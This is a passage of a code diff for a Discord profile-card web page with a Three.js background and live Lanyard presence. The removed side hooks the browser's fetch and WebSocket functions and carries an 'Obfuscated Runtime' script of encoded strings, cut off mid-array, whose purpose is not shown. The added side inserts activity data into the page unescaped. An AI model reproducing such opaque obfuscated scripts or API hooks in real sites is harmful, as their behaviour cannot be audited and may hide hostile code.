-        <svg class="av-ring" aria-hidden="true" focusable="false" viewBox="0 0 104 104" fill="none">
-          <circle cx="52" cy="52" r="49" stroke="rgba(212,175,55,.06)" stroke-width="1.5"/>
-          <circle cx="52" cy="52" r="49" stroke="url(#rg)" stroke-width="1.5"
-            stroke-dasharray="90 220" stroke-linecap="round"/>
+      <!-- Avatar -->
+      <div class="av-wrap">
+        <svg class="av-ring" aria-hidden="true" focusable="false" viewBox="0 0 106 106" fill="none">
+          <circle cx="53" cy="53" r="50" stroke="rgba(196,163,90,.05)" stroke-width="1.5"/>
+          <circle cx="53" cy="53" r="50" stroke="url(#rgrad)" stroke-width="1.5"
+            stroke-dasharray="85 228" stroke-linecap="round"/>
           <defs>
-            <linearGradient id="rg" x1="0" y1="0" x2="104" y2="104" gradientUnits="userSpaceOnUse">
-              <stop offset="0%"   stop-color="#d4af37" stop-opacity="0"/>
-              <stop offset="50%"  stop-color="#d4af37" stop-opacity="1"/>
-              <stop offset="100%" stop-color="#d4af37" stop-opacity="0"/>
+            <linearGradient id="rgrad" x1="0" y1="0" x2="106" y2="106" gradientUnits="userSpaceOnUse">
+              <stop offset="0%"   stop-color="#c4a35a" stop-opacity="0"/>
+              <stop offset="50%"  stop-color="#c4a35a" stop-opacity=".9"/>
+              <stop offset="100%" stop-color="#c4a35a" stop-opacity="0"/>
             </linearGradient>
           </defs>
         </svg>
-        <div class="av-in">
-          <img class="av" id="avImg"
-            src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='90' height='90'%3E%3Crect fill='%231a1a1a' width='90' height='90' rx='45'/%3E%3C/svg%3E"
-            alt="Discord user avatar" crossorigin="anonymous" width="90" height="90" decoding="async" loading="eager" fetchpriority="high">
-          <div class="sdot" id="sDot" aria-hidden="true"></div>
-        </div>
+        <img class="av" id="avImg"
+          src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='90' height='90'%3E%3Crect fill='%231a1a1a' width='90' height='90' rx='45'/%3E%3C/svg%3E"
+          alt="Discord user avatar" crossorigin="anonymous"
+          width="88" height="88" decoding="async" loading="eager" fetchpriority="high">
+        <div class="sdot" id="sDot" aria-hidden="true"></div>
       </div>
 
+      <!-- Name -->
       <h1 class="dname" id="dName" aria-live="polite">—</h1>
-      <p class="utag" id="uTag" aria-label="Username">@discord</p>
+      <span class="handle" id="uHandle" role="text" aria-label="Discord username">@discord</span>
+
+      <!-- Status -->
       <div class="sline" role="status" aria-live="polite">
         <div class="spip" id="sPip" aria-hidden="true"></div>
         <span class="sval" id="sVal">Connecting…</span>
       </div>
-      <div class="cs" id="cs" role="status" aria-live="polite" aria-label="Custom status"></div>
 
-      <!-- ── DM on Discord ── -->
-      <a class="dm-btn" id="dmBtn" href="https://discord.com" target="_blank" rel="noopener noreferrer" aria-label="Send a direct message on Discord">
+      <!-- Custom Status -->
+      <div class="cstatus" id="cStatus" role="status" aria-live="polite" aria-label="Custom status"></div>
+
+      <!-- DM Button -->
+      <a class="dm-btn" id="dmBtn"
+        href="https://discord.com" target="_blank" rel="noopener noreferrer"
+        aria-label="Send a message on Discord">
         <svg class="dm-icon" width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
           <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.043.03.054a19.905 19.905 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03z"/>
         </svg>
         <span>Message on Discord</span>
-        <span class="dm-arr">&#8594;</span>
+        <span class="dm-arr" aria-hidden="true">&#8594;</span>
       </a>
 
-      <hr class="div" aria-hidden="true">
+      <hr class="divider" aria-hidden="true">
 
-      <h2 class="slbl" id="activity-label">Current Activity</h2>
-      <div id="actArea" aria-labelledby="activity-label" aria-live="polite"><div class="no-a" role="status">No active session</div></div>
+      <!-- Activity -->
+      <h2 class="sec-lbl" id="act-lbl">Current Activity</h2>
+      <div id="actArea" aria-labelledby="act-lbl" aria-live="polite">
+        <div class="no-activity" role="status">No active session</div>
+      </div>
 
-      <hr class="div" style="margin-top:18px;" aria-hidden="true">
+      <hr class="divider" style="margin-top:18px;" aria-hidden="true">
 
-      <h2 class="slbl" id="pi-label">Personal Information</h2>
-      <dl class="pi-grid" aria-labelledby="pi-label">
-        <div class="pi-item"><dt class="pi-lbl">Pronouns</dt><dd class="pi-val">He / Him</dd></div>
-        <div class="pi-item"><dt class="pi-lbl">Age</dt><dd class="pi-val muted">Same as yesterday</dd></div>
-        <div class="pi-item"><dt class="pi-lbl">Location</dt><dd class="pi-val">☀️ Sun <span class="pi-val muted" style="display:block;font-size:9.5px;margin-top:1px;">Building from Galaxy</span></dd></div>
-        <div class="pi-item"><dt class="pi-lbl">Working</dt><dd class="pi-val">🌙 Moon~</dd></div>
-        <div class="pi-item full"><dt class="pi-lbl">Hobbies</dt><dd class="pi-val"><ul class="pi-tags" aria-label="Hobbies list"><li class="pi-tag">🎵 Music</li><li class="pi-tag">🎌 Anime</li><li class="pi-tag">💻 Coding</li><li class="pi-tag">🎮 Games</li></ul></dd></div>
+      <!-- Personal Info -->
+      <h2 class="sec-lbl" id="pi-lbl">Personal</h2>
+      <dl class="pi-grid" aria-labelledby="pi-lbl">
+        <div class="pi-item">
+          <dt class="pi-lbl">Pronouns</dt>
+          <dd class="pi-val">He / Him</dd>
+        </div>
+        <div class="pi-item">
+          <dt class="pi-lbl">Age</dt>
+          <dd class="pi-val muted">Same as yesterday</dd>
+        </div>
+        <div class="pi-item">
+          <dt class="pi-lbl">Location</dt>
+          <dd class="pi-val">
+            ☀️ Sun
+            <span class="pi-sub">Building from Galaxy</span>
+          </dd>
+        </div>
+        <div class="pi-item">
+          <dt class="pi-lbl">Working</dt>
+          <dd class="pi-val">🌙 Moon~</dd>
+        </div>
+        <div class="pi-item full">
+          <dt class="pi-lbl">Hobbies</dt>
+          <dd class="pi-val">
+            <ul class="tag-list" aria-label="Hobbies">
+              <li class="tag">🎵 Music</li>
+              <li class="tag">🎌 Anime</li>
+              <li class="tag">💻 Coding</li>
+              <li class="tag">🎮 Games</li>
+            </ul>
+          </dd>
+        </div>
       </dl>
 
-      <div class="cf" aria-hidden="true">
-        <div class="fl"></div><div class="fdot"></div>
-        <div class="flbl">Live Presence</div>
-        <div class="fdot"></div><div class="flr"></div>
+      <!-- Footer -->
+      <div class="card-footer" aria-hidden="true">
+        <div class="ft-line"></div>
+        <div class="ft-dot"></div>
+        <div class="ft-text">Live Presence</div>
+        <div class="ft-dot"></div>
+        <div class="ft-line r"></div>
       </div>
-    </div>
-  </div>
-</div>
+    </div><!-- .card -->
+  </div><!-- .cw -->
+</div><!-- .scene -->
 
-<!-- ═══ Structured skip link for a11y ═══ -->
-<a href="#card" class="skip-link" aria-label="Skip to main content">Skip to content</a>
-
-<!-- ═══ Three.js (sync — must be before runtime) ═══ -->
+<!-- Three.js -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js" crossorigin="anonymous"></script>
 
-<!-- ═══ DM Button: capture Discord user ID from Lanyard ═══ -->
 <script>
-(function(){
-  function setDmBtn(id){
-    var btn=document.getElementById('dmBtn');
-    if(btn&&id){btn.href='https://discord.com/users/'+id;window._dcUserId=id;}
+/* ═══════════════════════════════════════════════
+   CONFIG — set your Discord user ID here
+   ═══════════════════════════════════════════════ */
+const DISCORD_USER_ID = '1045863666412687380'; // ← paste your Discord user ID
+
+/* ═══════════════════════════════════════════════
+   THREE.JS BACKGROUND
+   ═══════════════════════════════════════════════ */
+(function initBG() {
+  if (!window.THREE) return;
+  const canvas = document.getElementById('bg');
+  const renderer = new THREE.WebGLRenderer({ canvas, antialias: false, alpha: true });
+  renderer.setPixelRatio(Math.min(devicePixelRatio, 2));
+  renderer.setClearColor(0x060606, 1);
+
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(60, innerWidth / innerHeight, 0.1, 2000);
+  camera.position.z = 500;
+
+  /* Particle field */
+  const PARTICLES = 600;
+  const geo = new THREE.BufferGeometry();
+  const pos = new Float32Array(PARTICLES * 3);
+  for (let i = 0; i < PARTICLES * 3; i++) {
+    pos[i] = (Math.random() - .5) * 1800;
   }
-  // intercept fetch to catch Lanyard REST responses
-  var _F=window.fetch;
-  window.fetch=function(){
-    var p=_F.apply(this,arguments);
-    var url=typeof arguments[0]==='string'?arguments[0]:(arguments[0]&&arguments[0].url)||'';
-    if(url.includes('lanyard.rest')){
-      p.then(function(r){return r.clone().json();}).then(function(d){
-        var id=(d&&d.data&&d.data.discord_user&&d.data.discord_user.id)||(d&&d.discord_user&&d.discord_user.id);
-        if(id)setDmBtn(id);
-      }).catch(function(){});
+  geo.setAttribute('position', new THREE.BufferAttribute(pos, 3));
+  const mat = new THREE.PointsMaterial({
+    size: 1.1,
+    color: 0xc4a35a,
+    transparent: true,
+    opacity: 0.18,
+    sizeAttenuation: true
+  });
+  const pts = new THREE.Points(geo, mat);
+  scene.add(pts);
+
+  /* Resize */
+  function resize() {
+    renderer.setSize(innerWidth, innerHeight);
+    camera.aspect = innerWidth / innerHeight;
+    camera.updateProjectionMatrix();
+  }
+  resize();
+  window.addEventListener('resize', resize, { passive: true });
+
+  /* Mouse parallax */
+  let mx = 0, my = 0;
+  window.addEventListener('mousemove', e => {
+    mx = (e.clientX / innerWidth  - .5) * 2;
+    my = (e.clientY / innerHeight - .5) * 2;
+  }, { passive: true });
+
+  let t = 0;
+  function animate() {
+    requestAnimationFrame(animate);
+    t += 0.0003;
+    pts.rotation.y = t + mx * 0.04;
+    pts.rotation.x = t * 0.4 + my * 0.025;
+    renderer.render(scene, camera);
+  }
+  animate();
+})();
+
+/* ═══════════════════════════════════════════════
+   TILT ON MOUSE MOVE
+   ═══════════════════════════════════════════════ */
+(function initTilt() {
+  const card = document.getElementById('card');
+  if (!card) return;
+  const scene = card.closest('.scene');
+  scene.addEventListener('mousemove', e => {
+    const r = card.getBoundingClientRect();
+    const cx = r.left + r.width  / 2;
+    const cy = r.top  + r.height / 2;
+    const dx = (e.clientX - cx) / (r.width  / 2);
+    const dy = (e.clientY - cy) / (r.height / 2);
+    card.style.transform = `rotateY(${dx * 5}deg) rotateX(${-dy * 4}deg)`;
+  }, { passive: true });
+  scene.addEventListener('mouseleave', () => {
+    card.style.transform = '';
+  }, { passive: true });
+})();
+
+/* ═══════════════════════════════════════════════
+   UTILITIES
+   ═══════════════════════════════════════════════ */
+const $ = id => document.getElementById(id);
+
+function elapsed(ts) {
+  const s = Math.floor((Date.now() - ts) / 1000);
+  if (s < 60)  return `${s}s`;
+  if (s < 3600) return `${Math.floor(s/60)}m ${s%60}s`;
+  const h = Math.floor(s / 3600);
+  const m = Math.floor((s % 3600) / 60);
+  return `${h}h ${m}m`;
+}
+
+function setStatus(status) {
+  const dot  = $('sDot');
+  const pip  = $('sPip');
+  const val  = $('sVal');
+  const cls  = ['online','idle','dnd'];
+  cls.forEach(c => { dot.classList.remove(c); pip.classList.remove(c); });
+  const labels = { online:'Online', idle:'Away', dnd:'Do Not Disturb', offline:'Offline' };
+  if (status !== 'offline') { dot.classList.add(status); pip.classList.add(status); }
+  val.textContent = labels[status] || 'Offline';
+  val.style.color = status === 'online'
+    ? 'rgba(59,165,92,.75)'
+    : status === 'idle'
+    ? 'rgba(250,166,26,.75)'
+    : status === 'dnd'
+    ? 'rgba(237,66,69,.75)'
+    : '';
+}
+
+function setCustomStatus(data) {
+  const el = $('cStatus');
+  const cs = data.activities?.find(a => a.type === 4);
+  if (!cs || (!cs.state && !cs.emoji)) { el.textContent = ''; return; }
+
+  let html = '';
+  if (cs.emoji) {
+    if (cs.emoji.id) {
+      html += `<img class="cs-emoji" src="https://cdn.discordapp.com/emojis/${cs.emoji.id}.${cs.emoji.animated?'gif':'png'}" alt="${cs.emoji.name}" aria-hidden="true">`;
+    } else {
+      html += `<span aria-hidden="true">${cs.emoji.name}</span>`;
     }
-    return p;
-  };
-  // intercept WebSocket for live Lanyard updates
-  var _WS=window.WebSocket;
-  window.WebSocket=function(url,proto){
-    var ws=proto?new _WS(url,proto):new _WS(url);
-    ws.addEventListener('message',function(e){
-      try{
-        var m=JSON.parse(e.data);
-        var id=m&&m.d&&m.d.discord_user&&m.d.discord_user.id;
-        if(id)setDmBtn(id);
-      }catch(_){}
+  }
+  if (cs.state) html += `<span>${cs.state}</span>`;
+  el.innerHTML = html;
+}
+
+function renderActivity(data) {
+  const area = $('actArea');
+  const acts = (data.activities || []).filter(a => a.type !== 4);
+
+  /* Spotify */
+  const sp = data.spotify;
+  if (sp) {
+    const pct = sp.timestamps
+      ? Math.min(100, ((Date.now() - sp.timestamps.start) / (sp.timestamps.end - sp.timestamps.start)) * 100)
+      : 0;
+    area.innerHTML = `
+      <div class="atile" role="article" aria-label="Listening on Spotify">
+        <div class="a-thumb">
+          <img src="${sp.album_art_url}" alt="${sp.album}" onerror="this.style.display='none'">
+        </div>
+        <div class="a-info">
+          <div class="a-name">🎵 ${sp.song}</div>
+          <div class="a-detail">${sp.artist}</div>
+          <div class="a-detail" style="opacity:.65">${sp.album}</div>
+          <div class="sp-bar"><div class="sp-prog" style="width:${pct.toFixed(1)}%"></div></div>
+        </div>
+      </div>`;
+    /* Update progress bar */
+    if (sp.timestamps) {
+      const prog = area.querySelector('.sp-prog');
+      const tick = () => {
+        const p = Math.min(100, ((Date.now() - sp.timestamps.start) / (sp.timestamps.end - sp.timestamps.start)) * 100);
+        if (prog) prog.style.width = p.toFixed(1) + '%';
+      };
+      const iv = setInterval(tick, 1000);
+      area._spTick = iv;
+    }
+    return;
+  }
+
+  if (area._spTick) { clearInterval(area._spTick); area._spTick = null; }
+
+  if (!acts.length) {
+    area.innerHTML = '<div class="no-activity" role="status">No active session</div>';
+    return;
+  }
+
+  area.innerHTML = acts.map(a => {
+    let thumb = '';
+    if (a.assets?.large_image) {
+      const src = a.assets.large_image.startsWith('mp:external/')
+        ? 'https://media.discordapp.net/external/' + a.assets.large_image.replace('mp:external/', '')
+        : `https://cdn.discordapp.com/app-assets/${a.application_id}/${a.assets.large_image}.png`;
+      thumb = `<img src="${src}" alt="${a.name}" onerror="this.parentElement.innerHTML='🎮'">`;
+    } else {
+      thumb = '🎮';
+    }
+    const elapsed_str = a.timestamps?.start ? elapsed(a.timestamps.start) : '';
+    return `
+      <div class="atile" role="article" aria-label="${a.name}">
+        <div class="a-thumb">${thumb}</div>
+        <div class="a-info">
+          <div class="a-name">${a.name}</div>
+          ${a.details ? `<div class="a-detail">${a.details}</div>` : ''}
+          ${a.state   ? `<div class="a-detail">${a.state}</div>`   : ''}
+          ${elapsed_str ? `<div class="a-elapsed">${elapsed_str} elapsed</div>` : ''}
+        </div>
+      </div>`;
+  }).join('');
+
+  /* Update elapsed timers */
+  if (area._elTick) clearInterval(area._elTick);
+  area._elTick = setInterval(() => {
+    area.querySelectorAll('.a-elapsed').forEach((el, i) => {
+      const ts = acts[i]?.timestamps?.start;
+      if (ts) el.textContent = elapsed(ts) + ' elapsed';
     });
-    return ws;
-  };
-  window.WebSocket.prototype=_WS.prototype;
-})();
-</script>
+  }, 1000);
+}
 
-<!-- ═══ Obfuscated Runtime ═══ -->
-<script>(function(){
-'use strict';
-var _$=["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", 